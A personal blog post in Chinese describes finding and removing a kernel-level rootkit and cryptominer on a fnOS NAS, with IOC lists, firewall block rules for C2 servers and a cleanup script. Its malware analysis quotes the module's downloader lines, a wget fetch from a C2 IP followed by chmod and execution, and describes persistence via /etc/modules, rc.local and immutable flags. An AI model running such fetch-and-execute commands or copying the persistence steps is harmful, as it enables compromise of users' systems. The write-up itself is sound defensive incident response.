---
title: "记一次飞牛fnOS内核级Rootkit入侵事件：从发现到清除的完整过程"
date: 2026-02-01
description: "本文记录了我的飞牛NAS遭受内核级Rootkit攻击的全过程，包括如何发现、分析、清除恶意软件，以及最终的溯源分析。希望能给其他fnOS用户提供参考。"
categories:
  - 安全事件
tags:
  - fnOS
  - 飞牛NAS
  - 内核Rootkit
  - 安全事件响应
  - Claude Code
---

> 本文记录了我的飞牛NAS遭受内核级Rootkit攻击的全过程，包括如何发现、分析、清除恶意软件，以及最终的溯源分析。希望能给其他fnOS用户提供参考。

**事件时间**: 2026年1月31日 - 2月1日  
**受影响系统**: 飞牛fnOS (FNOS)  
**威胁等级**: 极高危（内核级Rootkit）  
**最终结果**: 成功清除，系统恢复正常

* * *

## 一、事件发现：小红书上的安全警告

### 1.1 朋友转发的帖子

2026年1月31日晚，我像往常一样玩claude，突然朋友转发了一篇让我心惊的帖子：

> **🚨飞牛 fnOS 疑似遭大规模漏洞利用，请立刻关闭公网访问！**
> 
> 最近几天，飞牛 fnOS 用户反馈设备被远程控制、异常占网、上传异常文件。经过多位用户与安全团队分析，确认存在未授权访问漏洞，部分设备被植入后门，可能已被纳入僵尸网络用于发起攻击。

帖子中提到的关键信息：

-   **风险等级**: 高危
-   **影响版本**: 官方未公布，疑似多个版本受影响
-   **风险条件**: 设备管理页面或端口被公网直接访问
-   **已知攻击行为**:
    -   植入木马文件
    -   与 `45.95.212.102`、`151.240.13.91` 等服务器通信
    -   创建隐藏服务 `/sbin/gots`、`/usr/bin/nginx`
    -   部分样本包含内核模块 `snd_pcap.ko`

看到这里，我意识到情况可能很严重——我的fnOS是有公网访问的。

### 1.2 立即自查：CPU 100%！

我立刻打开PVE（Proxmox Virtual Environment）查看fnOS虚拟机的状态。

**结果让我倒吸一口凉气：CPU使用率100%！**

```
┌─────────────────────────────────────────────────────────┐
│  PVE 虚拟机监控面板                                      │
├─────────────────────────────────────────────────────────┤
│  VM: fnOS-NAS                                           │
│  CPU: ████████████████████████████████████████ 100%    │
│  内存: ██████████░░░░░░░░░░░░░░░░░░░░ 45%              │
│  网络: 异常高流量                                        │
└─────────────────────────────────────────────────────────┘
```

正常情况下，我的NAS在空闲时CPU使用率应该在5%以下。100%的CPU占用明显不正常，很可能正在进行加密货币挖矿。

我SSH登录到系统，使用`top`命令查看进程，但奇怪的是**找不到任何高CPU占用的进程**。这更加印证了我的担忧——这可能是一个会隐藏自身的Rootkit。

* * *

## 二、深入分析：发现内核级Rootkit

### 2.1 借助Claude Code进行分析

面对这种复杂的安全事件，我决定使用Claude Code（Anthropic的CLI工具）来帮助我分析和清理系统。

首先，我让Claude帮我扫描系统中的可疑文件：

```bash
# 扫描可疑的小文件（10-50KB，常见恶意软件大小）
find /usr/bin /sbin -size +10k -size -50k -type f
```

### 2.2 发现的恶意文件

扫描结果触目惊心，发现了以下可疑文件：

| 文件路径 | 大小 | MD5 | 创建时间 |
| --- | --- | --- | --- |
| `/sbin/gots` | 14KB | 2808f5debbd7f4eca90f6242eb8811d5 | 2026-01-31 23:42 |
| `/usr/bin/dockers` | 14KB | f9a6e2f3ef067159774a7bcdb9fbb132 | 2025-01-21 23:01 |
| `/usr/bin/4Va` | 14KB | b6468a4813e05487ff6a686f466f81db | 2025-01-21 23:01 |
| `/usr/bin/mNxc` | 14KB | 49d33fae631fdf4f2ce220d343268aa2 | 2025-01-22 00:16 |
| `/usr/bin/reMYUBLt` | 14KB | 05b041d90a8b4019f5711bed243cf16d | 2025-01-22 03:13 |

更可怕的是，我还发现了**两个恶意内核模块**：

| 模块路径 | 大小 | MD5 |
| --- | --- | --- |
| `/lib/modules/6.12.18-trim/async_memcpys.ko` | 6.4KB | a26a90060f463d4e10bc558e6758d67e |
| `/lib/modules/6.12.18-trim/snd_pcap.ko` | 6.5KB | dc47eef59a495b378d363cb8d0c61fbd |

### 2.3 分析内核模块

使用`strings`命令分析内核模块，发现了惊人的内容：

```bash
$ strings /lib/modules/6.12.18-trim/async_memcpys.ko
```

输出中包含：

```
wget http://43.198.11.122/Fnos -O /tmp/Fnos
chmod 777 /tmp/Fnos
/tmp/Fnos
rm -rf /tmp/Fnos
call_usermodehelper
```

这是一个典型的**内核级下载器**！它使用`call_usermodehelper`在内核空间执行用户空间命令，从C2服务器下载并执行恶意载荷。

另一个模块`snd_pcap.ko`也包含类似的代码，但连接的是另一个C2服务器`151.240.13.91`。

### 2.4 持久化机制分析

攻击者使用了多重持久化机制：

**1\. /etc/modules 自动加载内核模块**

```
# /etc/modules
bonding
msr
async_memcpys    # 恶意模块！
snd_pcap         # 恶意模块！
```

**2\. /etc/rc.local 启动恶意程序**

```bash
/sbin/gots fnos &
/sbin/gots fnso &
/sbin/gots x86 &
```

**3\. immutable属性保护**

攻击者还给`/sbin/gots`设置了immutable属性，并且**删除了`/usr/bin/chattr`工具**，防止管理员移除保护属性！

```bash
$ lsattr /sbin/gots
----i---------e------- /sbin/gots

$ which chattr
# 找不到！被删除了！
```

这是我见过的最狡猾的反取证手段之一。

* * *

## 三、清除过程：与Rootkit的战斗

### 3.1 恢复chattr工具

首先要解决chattr被删除的问题。由于apt有依赖冲突，我选择手动下载e2fsprogs包提取chattr：

```bash
# 下载e2fsprogs包
wget https://mirrors.ustc.edu.cn/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2+b2_amd64.deb

# 提取chattr
dpkg-deb -x e2fsprogs_1.47.0-2+b2_amd64.deb /tmp/e2fsprogs_extract
sudo cp /tmp/e2fsprogs_extract/usr/bin/chattr /usr/bin/chattr
sudo chmod 755 /usr/bin/chattr
```

✅ chattr工具恢复成功！

### 3.2 移除immutable属性

```bash
sudo chattr -i /sbin/gots
sudo chattr -i /etc/rc.local
```

### 3.3 卸载恶意内核模块

```bash
sudo modprobe -r async_memcpys
sudo modprobe -r snd_pcap

# 验证
lsmod | grep -E "snd_pcap|async_memcpys"
# 无输出，卸载成功
```

### 3.4 删除恶意文件

```bash
# 删除内核模块文件
sudo rm -f /lib/modules/6.12.18-trim/async_memcpys.ko
sudo rm -f /lib/modules/6.12.18-trim/snd_pcap.ko

# 删除用户层恶意软件
sudo rm -f /sbin/gots
sudo rm -f /usr/bin/dockers
sudo rm -f /usr/bin/4Va
sudo rm -f /usr/bin/mNxc
sudo rm -f /usr/bin/reMYUBLt
```

### 3.5 清理持久化配置

**清理/etc/modules：**

```bash
sudo sed -i '/async_memcpys/d' /etc/modules
sudo sed -i '/snd_pcap/d' /etc/modules
```

**清理/etc/rc.local：**

```bash
sudo sed -i '/gots/d' /etc/rc.local
```

### 3.6 封锁C2服务器

```bash
# 封锁所有已知C2服务器
sudo iptables -A INPUT -s 43.198.11.122 -j DROP
sudo iptables -A OUTPUT -d 43.198.11.122 -j DROP
sudo iptables -A INPUT -s 151.240.13.91 -j DROP
sudo iptables -A OUTPUT -d 151.240.13.91 -j DROP
sudo iptables -A INPUT -s 20.89.168.131 -j DROP
sudo iptables -A OUTPUT -d 20.89.168.131 -j DROP

# 持久化防火墙规则
sudo apt-get install iptables-persistent
sudo netfilter-persistent save
```

### 3.7 重建系统配置

```bash
# 重建内核模块依赖
sudo depmod -a

# 更新initramfs（确保恶意模块不会在启动时加载）
sudo update-initramfs -u -k 6.12.18-trim
```

### 3.8 重启验证

重启系统后，再次检查：

```
┌─────────────────────────────────────────────────────────┐
│  重启后验证结果                                          │
├─────────────────────────────────────────────────────────┤
│  ✅ 恶意内核模块: 未加载                                 │
│  ✅ 恶意文件: 已删除                                     │
│  ✅ 恶意进程: 无运行                                     │
│  ✅ /etc/modules: 已清理                                │
│  ✅ /etc/rc.local: 已清理                               │
│  ✅ C2封锁规则: 已生效                                  │
│  ✅ CPU使用率: 正常 (5%以下)                            │
└─────────────────────────────────────────────────────────┘
```

**CPU使用率恢复正常！** 从100%降到5%以下，系统终于安静了。

* * *

## 四、溯源分析：谁是幕后黑手？

### 4.1 C2服务器分析

| IP地址 | 位置 | 服务商 | 用途 |
| --- | --- | --- | --- |
| 43.198.11.122 | 香港 | AWS EC2 | 载荷下载服务器 |
| 151.240.13.91 | 香港 | IPXO（匿名IP服务） | 载荷下载服务器 |
| 20.89.168.131 | 日本东京 | Microsoft Azure | 持久化通信服务器 |

攻击者使用了三个不同云服务商的服务器，分布在香港和日本，体现了较高的运营安全意识。

### 4.2 攻击者真实IP

**遗憾的是，攻击者的真实IP无法追踪**。

原因是攻击者清理了所有登录日志：

-   wtmp记录被清除
-   btmp记录被清除
-   SSH日志无历史记录
-   journald无相关时间段记录

这是一个具有较强反取证意识的攻击者。

### 4.3 攻击时间线

```
2025-01-21 23:01  │ 初始入侵，部署 dockers、4Va
2025-01-22 00:16  │ 部署 mNxc
2025-01-22 03:13  │ 部署 reMYUBLt
2025-01-22 03:25  │ 部署 snd_pcap.ko 内核模块
     ...          │ 潜伏期（约1年）
2026-01-31 16:12  │ 部署 async_memcpys.ko 新内核模块
2026-01-31 23:42  │ 部署 /sbin/gots，删除chattr
2026-02-01 00:01  │ 我发现异常并开始清理
2026-02-01 00:44  │ 清理完成
```

**我的系统被感染了整整一年才发现！** 这让我非常后怕。

### 4.4 攻击者画像

```
┌────────────────────────────────────────────────────────────────┐
│                     攻击者画像                                  │
├────────────────────────────────────────────────────────────────┤
│  真实身份: 未知                                                 │
│  技术水平: 高级 (内核级rootkit开发能力)                         │
│  攻击动机: 加密货币挖矿 / 僵尸网络扩展                          │
│  运营安全: 高 (多云C2、匿名IP服务、日志清理)                    │
│  目标类型: NAS设备 (专门针对FNOS系统)                           │
│  活动区域: 亚太地区 (香港、日本)                                │
└────────────────────────────────────────────────────────────────┘
```

根据小红书帖子和威胁情报分析：

-   全球约**30万台fnOS暴露公网**
-   攻击者疑似**2-3个团伙同时活动**
-   已捕捉到**DDoS攻击指令**
-   被感染设备可能被用于**发起攻击或挖矿**

* * *

## 五、IOC（入侵威胁指标）汇总

### 5.1 网络IOC

```
# C2服务器
43.198.11.122     # 香港 - AWS EC2
151.240.13.91     # 香港 - IPXO
20.89.168.131     # 日本东京 - Azure
45.95.212.102     # 小红书帖子提到

# 恶意URL
http://43.198.11.122/Fnos
http://151.240.13.91/Fnos
http://20.89.168.131/nginx
```

### 5.2 文件IOC

```
# MD5哈希
a26a90060f463d4e10bc558e6758d67e  async_memcpys.ko
dc47eef59a495b378d363cb8d0c61fbd  snd_pcap.ko
2808f5debbd7f4eca90f6242eb8811d5  gots
f9a6e2f3ef067159774a7bcdb9fbb132  dockers
b6468a4813e05487ff6a686f466f81db  4Va
49d33fae631fdf4f2ce220d343268aa2  mNxc
05b041d90a8b4019f5711bed243cf16d  reMYUBLt

# 恶意文件路径
/lib/modules/*/async_memcpys.ko
/lib/modules/*/snd_pcap.ko
/sbin/gots
/usr/bin/dockers
/usr/bin/4Va
/usr/bin/mNxc
/usr/bin/reMYUBLt
/usr/bin/nginx (小红书帖子提到)
/tmp/Fnos
```

### 5.3 行为IOC

```
# 检查这些配置是否被篡改
/etc/modules      # 是否有 async_memcpys、snd_pcap
/etc/rc.local     # 是否有 gots 相关命令

# 检查这些工具是否被删除
/usr/bin/chattr   # 攻击者会删除此工具

# 检查是否有无PID的监听端口
netstat -tlnp | grep -v "PID"
```

* * *

## 六、安全建议

### 6.1 紧急措施（如果你也是fnOS用户）

1.  **立即关闭公网访问** - 包括端口映射、反向代理
2.  **检查CPU使用率** - 异常高占用可能是挖矿
3.  **运行以下检查命令**：

```bash
# 检查恶意内核模块
lsmod | grep -E "snd_pcap|async_memcpys"

# 检查恶意文件
ls -la /sbin/gots /usr/bin/dockers /usr/bin/nginx 2>/dev/null

# 检查/etc/modules
cat /etc/modules | grep -E "snd_pcap|async_memcpys"

# 检查/etc/rc.local
cat /etc/rc.local | grep gots

# 检查chattr是否存在
which chattr
```

4.  **升级到官方建议版本** - fnOS 1.1.15

### 6.2 长期安全加固

1.  **SSH安全**
    
    -   更换默认端口（不要用22）
    -   使用密钥认证，禁用密码登录
    -   部署fail2ban
2.  **网络安全**
    
    -   使用VPN访问NAS（如Tailscale、WireGuard）
    -   不要将管理端口暴露到公网
    -   配置防火墙限制出站连接
3.  **系统监控**
    
    -   定期检查CPU使用率
    -   监控异常网络流量
    -   启用审计日志
4.  **定期备份**
    
    -   使用3-2-1备份策略
    -   定期验证备份可用性

* * *

## 七、经验总结

### 7.1 这次事件教会了我什么

1.  **NAS不应该直接暴露公网** - 这是最重要的教训。即使使用HTTPS，也无法防御未知漏洞。
    
2.  **定期检查系统状态** - 如果我早点注意到CPU异常，可能不会被感染一年之久。
    
3.  **内核级Rootkit非常难以检测** - 普通的`top`、`ps`命令看不到隐藏的进程。
    
4.  **攻击者会删除安全工具** - 删除`chattr`是很聪明的反取证手段。
    
5.  **日志清理是常规操作** - 不要指望通过日志追踪攻击者。
    

### 7.2 Claude Code的帮助

这次事件中，Claude Code帮了大忙：

-   **自动化扫描** - 快速定位可疑文件
-   **内核模块分析** - 提取和分析恶意代码
-   **系统清理** - 按正确顺序执行清理步骤
-   **溯源分析** - 搜索威胁情报，关联已知攻击

作为一个非专业安全人员，有AI助手的帮助让我能够应对这种复杂的安全事件。

### 7.3 写在最后

这次经历让我深刻认识到：**安全无小事**。

一个NAS，存储着我所有的照片、文档、代码，如果被攻击者完全控制，后果不堪设想。更可怕的是，我的设备可能已经被用来攻击其他人——这让我感到很内疚。

希望这篇文章能帮助其他fnOS用户检查和清理自己的系统。如果你发现了类似的感染，欢迎交流。

**Stay safe, stay offline (for NAS).**

* * *

## 附录：完整清理脚本

如果你确认系统已被感染，可以参考以下脚本进行清理：

```bash
#!/bin/bash
# fnOS Rootkit清理脚本
# 警告：请先备份重要数据！

echo "=== fnOS Rootkit 清理脚本 ==="
echo "警告：此脚本会修改系统配置，请确保你了解每一步操作"
read -p "确认继续？(yes/no): " confirm
if [ "$confirm" != "yes" ]; then
    echo "已取消"
    exit 1
fi

# 1. 恢复chattr（如果被删除）
if ! command -v chattr &> /dev/null; then
    echo "[1/8] 恢复chattr工具..."
    cd /tmp
    wget -q https://mirrors.ustc.edu.cn/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2+b2_amd64.deb
    dpkg-deb -x e2fsprogs_1.47.0-2+b2_amd64.deb e2fsprogs_extract
    sudo cp e2fsprogs_extract/usr/bin/chattr /usr/bin/chattr
    sudo chmod 755 /usr/bin/chattr
    rm -rf e2fsprogs_extract e2fsprogs_1.47.0-2+b2_amd64.deb
else
    echo "[1/8] chattr工具存在，跳过"
fi

# 2. 移除immutable属性
echo "[2/8] 移除immutable属性..."
sudo chattr -i /sbin/gots 2>/dev/null
sudo chattr -i /etc/rc.local 2>/dev/null

# 3. 卸载恶意内核模块
echo "[3/8] 卸载恶意内核模块..."
sudo modprobe -r async_memcpys 2>/dev/null
sudo modprobe -r snd_pcap 2>/dev/null

# 4. 删除恶意文件
echo "[4/8] 删除恶意文件..."
sudo rm -f /lib/modules/*/async_memcpys.ko
sudo rm -f /lib/modules/*/snd_pcap.ko
sudo rm -f /sbin/gots
sudo rm -f /usr/bin/dockers
sudo rm -f /usr/bin/4Va
sudo rm -f /usr/bin/mNxc
sudo rm -f /usr/bin/reMYUBLt
sudo rm -f /usr/bin/nginx  # 如果是恶意的

# 5. 清理/etc/modules
echo "[5/8] 清理/etc/modules..."
sudo sed -i '/async_memcpys/d' /etc/modules
sudo sed -i '/snd_pcap/d' /etc/modules

# 6. 清理/etc/rc.local
echo "[6/8] 清理/etc/rc.local..."
sudo sed -i '/gots/d' /etc/rc.local

# 7. 封锁C2服务器
echo "[7/8] 封锁C2服务器..."
for ip in 43.198.11.122 151.240.13.91 20.89.168.131 45.95.212.102; do
    sudo iptables -A INPUT -s $ip -j DROP
    sudo iptables -A OUTPUT -d $ip -j DROP
done

# 保存iptables规则
sudo mkdir -p /etc/iptables
sudo iptables-save | sudo tee /etc/iptables/rules.v4 > /dev/null

# 8. 重建系统配置
echo "[8/8] 重建系统配置..."
sudo depmod -a
sudo update-initramfs -u -k $(uname -r)

echo ""
echo "=== 清理完成 ==="
echo "请重启系统并验证："
echo "  1. lsmod | grep -E 'snd_pcap|async_memcpys'"
echo "  2. ls -la /sbin/gots"
echo "  3. top (检查CPU使用率)"
echo ""
echo "建议：重启后修改所有密码！"
```

* * *

**文章信息**

-   作者：breeze
-   日期：2026-02-01
-   分类：安全事件、NAS、Rootkit
-   标签：fnOS, 飞牛NAS, 内核Rootkit, 安全事件响应, Claude Code

**相关链接**

-   [Fortinet: Deep Dive Into a Linux Rootkit Malware](https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware)
-   [Microsoft: Rise in XorDdos](https://www.microsoft.com/en-us/security/blog/2022/05/19/rise-in-xorddos-a-deeper-look-at-the-stealthy-ddos-malware-targeting-linux-devices/)
-   [Elastic: Declawing PUMAKIT](https://www.elastic.co/security-labs/declawing-pumakit)
